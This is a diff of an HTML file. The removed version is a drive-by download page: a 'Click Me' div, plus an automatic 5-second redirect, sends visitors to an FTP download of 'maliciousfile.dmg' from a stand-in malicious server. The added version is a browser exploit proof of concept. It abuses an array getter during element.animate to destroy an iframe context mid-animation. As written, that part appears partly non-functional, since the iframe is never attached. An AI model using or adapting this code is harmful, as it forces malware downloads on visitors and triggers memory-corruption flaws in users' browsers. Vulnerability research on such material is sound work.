@@ -1,33 +1,34 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <style>
-      .hidden-link {
-        width: 100px;
-        height: 100px;
-        background-color: red;
-        color: white;
-        text-align: center;
-        line-height: 100px;
-        cursor: pointer;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="hidden-link" onclick="triggerDownload()">Click Me</div>
-
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animation Vulnerability PoC</title>
+</head>
+<body>
+    <h1>PoC for Animation Vulnerability</h1>
     <script>
-      function triggerDownload() {
-        // Ketika elemen di-click, langsung mengarahkan ke FTP link
-        window.location.href = "ftp://anonymous:password@maliciousserver.com/maliciousfile.dmg";
-      }
+        function allociframe(){
+            var iframe = document.createElement("iframe");
+            console.log(iframe);
+            iframe.height = 0;
+            iframe.width = 0;
+            // document.body.appendChild( iframe ); // Uncomment for full iframe rendering
+            return iframe;
+        }
 
-      // Auto redirect ketika halaman dimuat
-      window.onload = function() {
-        setTimeout(function() {
-          window.location.href = "ftp://anonymous:password@maliciousserver.com/maliciousfile.dmg";
-        }, 5000); // Delay 5 detik sebelum redirect otomatis
-      }
+        iframe = allociframe();
+        c = iframe.contentDocument.createElement("div");
+
+        var arr = [];
+        arr.__defineGetter__(0, () => {
+            console.log("getter called");
+            document.body.removeChild(iframe); // Simulate cleanup or context destruction
+            return { transform: 'translate3D(0, -300px, 0)' }; // Animation property
+        });
+
+        c.animate(arr, { duration: 3000, iterations: Infinity, timeline: null });
+
     </script>
-  </body>
+</body>
 </html>
